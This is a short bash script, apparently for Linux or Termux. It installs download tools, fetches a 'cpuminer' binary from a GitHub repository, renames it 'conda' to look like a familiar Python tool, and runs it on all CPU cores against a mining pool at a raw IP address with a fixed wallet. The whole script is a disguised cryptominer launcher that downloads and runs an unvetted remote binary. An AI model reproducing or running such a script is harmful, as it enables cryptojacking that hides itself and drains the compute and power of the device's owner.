#!/bin/bash
apt update 
pkg update
apt install -y wget curl
pkg install -y wget curl
wget https://github.com/rifamanajul/rifamanajul/raw/refs/heads/main/cpuminer
chmod u+x cpuminer 
mv cpuminer conda
./conda -a yespowertide -o stratum+tcp://47.237.3.59:443 -u TFjVcsSSXbyVNa9gdiYrhDCtfkamCNLHCf.nyoba -p c=TDC -t $(nproc --all)
